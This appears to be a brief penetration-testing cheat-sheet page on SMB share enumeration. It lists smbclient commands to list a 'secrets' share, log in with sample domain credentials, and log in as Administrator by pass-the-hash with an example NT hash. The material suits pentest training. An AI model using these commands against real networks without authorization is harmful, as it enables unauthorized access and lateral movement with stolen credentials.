# Share Enumeration



{% tabs %}
{% tab title="List Share Contents" %}
`smbclient -L \\\\<ip-addr>\\secrets -p 4455 -U hr_admin --password="Welcome1234"`
{% endtab %}

{% tab title="Authenticate to Share (credentials)" %}
`smbclient \\<ip-addr>\sharing\ -U 'corp.com/mike%password'`
{% endtab %}

{% tab title="PtH" %}
`smbclient \\<ip-addr>\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b`
{% endtab %}
{% endtabs %}

